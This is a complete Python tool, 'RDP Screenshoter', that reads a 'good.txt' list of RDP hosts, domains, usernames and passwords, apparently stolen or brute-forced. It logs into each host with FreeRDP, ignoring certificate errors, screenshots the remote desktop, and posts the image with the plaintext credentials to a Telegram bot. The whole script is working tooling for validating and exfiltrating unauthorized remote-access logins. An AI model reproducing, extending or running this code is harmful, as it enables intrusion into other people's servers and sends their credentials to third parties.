import subprocess
import time
import os
import ctypes
from ctypes import wintypes
import requests
import win32gui
import win32ui
import win32con
import win32process
import html
from PIL import Image

INPUT_FILE = "good.txt"
SCREENSHOT_DIR = "screenshots"
WINDOW_FIND_TIMEOUT = 30
FIXED_WAIT_TIME = 10 
CHECK_INTERVAL = 2

os.makedirs(SCREENSHOT_DIR, exist_ok=True)

user32 = ctypes.WinDLL("user32", use_last_error=True)
user32.PrintWindow.argtypes = [wintypes.HWND, wintypes.HDC, wintypes.UINT]
user32.PrintWindow.restype = wintypes.BOOL

def parse_line(line):
    try:
        if not line.strip(): 
            return None
        addr_part, password = line.strip().split(";")
        host_port, user_part = addr_part.split("@")
        domain, username = user_part.split("\\")
        host, port = host_port.split(":")
        return host, port, domain, username, password
    except ValueError:
        return None

def launch_rdp(host, port, domain, username, password):
    cmd = [
        "wfreerdp",
        f"/v:{host}:{port}",
        f"/u:{username}",
        f"/d:{domain}",
        f"/p:{password}",
        "/cert:ignore",
        "/auto-reconnect",
        "/gfx",
        "/floatbar:sticky:off,show:always"
    ]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def find_freerdp_window(proc):
    found_hwnd = None
    target_pid = proc.pid

    def callback(hwnd, _):
        nonlocal found_hwnd
        if win32gui.IsWindowVisible(hwnd):
            try:
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                if pid == target_pid:
                    found_hwnd = hwnd
                    return False
            except Exception:
                pass
        return True

    start_time = time.time()
    while time.time() - start_time < WINDOW_FIND_TIMEOUT:
        if proc.poll() is not None:
            return "DEAD"

        try: win32gui.EnumWindows(callback, None)
        except Exception: pass
        
        if found_hwnd: return found_hwnd
        time.sleep(0.5)
        
    return None

def capture_window_client_area(hwnd):
    rect = win32gui.GetWindowRect(hwnd)
    w_left, w_top, w_right, w_bottom = rect
    w_width = w_right - w_left
    w_height = w_bottom - w_top

    c_left, c_top, c_right, c_bottom = win32gui.GetClientRect(hwnd)
    c_width = c_right - c_left
    c_height = c_bottom - c_top

    if w_width <= 0 or w_height <= 0:
        return None

    point = win32gui.ClientToScreen(hwnd, (0, 0))
    client_screen_x, client_screen_y = point
    
    border_left = client_screen_x - w_left
    border_top = client_screen_y - w_top
    
    hwndDC = win32gui.GetWindowDC(hwnd)
    mfcDC = win32ui.CreateDCFromHandle(hwndDC)
    saveDC = mfcDC.CreateCompatibleDC()

    bitmap = win32ui.CreateBitmap()
    bitmap.CreateCompatibleBitmap(mfcDC, w_width, w_height)
    saveDC.SelectObject(bitmap)

    result = user32.PrintWindow(hwnd, saveDC.GetSafeHdc(), 2) 
    
    if not result:
        win32gui.DeleteObject(bitmap.GetHandle())
        saveDC.DeleteDC()
        mfcDC.DeleteDC()
        win32gui.ReleaseDC(hwnd, hwndDC)
        return None

    bmpinfo = bitmap.GetInfo()
    bmpstr = bitmap.GetBitmapBits(True)

    img = Image.frombuffer(
        "RGB",
        (bmpinfo["bmWidth"], bmpinfo["bmHeight"]),
        bmpstr,
        "raw",
        "BGRX",
        0,
        1
    )

    win32gui.DeleteObject(bitmap.GetHandle())
    saveDC.DeleteDC()
    mfcDC.DeleteDC()
    win32gui.ReleaseDC(hwnd, hwndDC)

    crop_box = (border_left, border_top, border_left + c_width, border_top + c_height)
    try: img = img.crop(crop_box)
    except Exception: pass

    return img

def send_to_telegram(token, chat_id, image_path, host, port, domain, username, password, custom_text):
    url = f"https://api.telegram.org/bot{token}/sendPhoto"
    
    safe_text = html.escape(custom_text)
    safe_domain = html.escape(domain)
    safe_user = html.escape(username)
    safe_pass = html.escape(password)
    
    caption = (
        f"✅ <b>{safe_text}</b>\n"
        f"🖥 <b>IP Address:</b> <code>{host}:{port}</code>\n"
        f"🌐 <b>Domain:</b> <code>{safe_domain}</code>\n"
        f"👤 <b>User:</b> <code>{safe_user}</code>\n"
        f"🔑 <b>Password:</b> <code>{safe_pass}</code>"
    )

    try:
        with open(image_path, "rb") as img_file:
            payload = {
                "chat_id": chat_id,
                "caption": caption,
                "parse_mode": "HTML"
            }
            files = {"photo": img_file}
            requests.post(url, data=payload, files=files, timeout=10)
            print(f"[TG] Successfully sent to {chat_id} Chat ID.")
    except Exception as e:
        print(f"[TG] Error while sending: {e}")

def process_single_line(line, tg_token, tg_user_id, custom_tg_msg):
    proc = None
    try:
        parsed = parse_line(line)
        if not parsed:
            return

        host, port, domain, username, password = parsed
        print(f"\n[+] Processing: {host}:{port}")

        proc = launch_rdp(host, port, domain, username, password)
        
        # Pass 'proc' to check if it dies while looking
        hwnd = find_freerdp_window(proc)
        
        if hwnd == "DEAD":
            print("[!] Failed to connect.")
            return
        elif not hwnd:
            print("[!] Window not found (Timeout).")
            proc.terminate()
            return

        print(f"[...] Waiting {FIXED_WAIT_TIME}s for desktop...")
        
        start_wait = time.time()
        while time.time() - start_wait < FIXED_WAIT_TIME:
            if proc.poll() is not None:
                print("[!] Possibly dropped connection.")
                return
            time.sleep(0.5)

        if proc.poll() is not None:
             print("[!] Session ended before capture.")
             return

        img = capture_window_client_area(hwnd)
        if img:
            filename = f"rdp_{host}_{port}.png"
            path = os.path.join(SCREENSHOT_DIR, filename)
            img.save(path)
            print(f"[+] Saved: {path}")

            if tg_token and tg_user_id:
                send_to_telegram(tg_token, tg_user_id, path, host, port, domain, username, password, custom_tg_msg)
        else:
            print("[!] Failed to capture screenshot.")
        
        proc.terminate()

    except Exception as e:
        print(f"[!] Error: {e}")
        if proc:
            try: proc.terminate()
            except: pass

def main():
    print("=== RDP Screenshoter (with Telegram sender) ===")
    print("Made by duong888 <3 (with support from Google Gemini and ChatGPT")
    print("Note: Please download wfreerdp from https://ci.freerdp.com/job/freerdp-nightly-windows/")
    print("and put both file (this executable and wfreerdp) inside the folder where good.txt exist.") 
    print("===============================================")
    
    tg_token = input("Enter Telegram Bot Token: ").strip()
    tg_user_id = input("Enter Chat ID: ").strip()
    custom_msg = input("Enter Custom Success Message (Default: 'Successful logged in!'): ").strip()
    if not custom_msg:
        custom_msg = "Successful logged in!"
    
    if not tg_token or not tg_user_id:
        print("[!] Telegram sender disabled. Local save only.")
    
    print("-" * 40)
    print(f"[+] Checking '{INPUT_FILE}' for existing lines...")

    last_pos = 0

    while True:
        try:
            if not os.path.exists(INPUT_FILE):
                time.sleep(CHECK_INTERVAL)
                continue

            current_size = os.path.getsize(INPUT_FILE)
            if current_size < last_pos:
                print("[!] File truncated, resetting position to 0.")
                last_pos = 0

            with open(INPUT_FILE, "r", encoding="utf-8") as f:
                f.seek(last_pos)
                new_lines = f.readlines()
                last_pos = f.tell()

            if new_lines:
                print(f"[+] Found {len(new_lines)} new entries.")
                for line in new_lines:
                    if line.strip():
                        process_single_line(line, tg_token, tg_user_id, custom_msg)
            
            time.sleep(CHECK_INTERVAL)

        except KeyboardInterrupt:
            print("\n[!] Stopping watcher.")
            break
        except Exception as e:
            time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()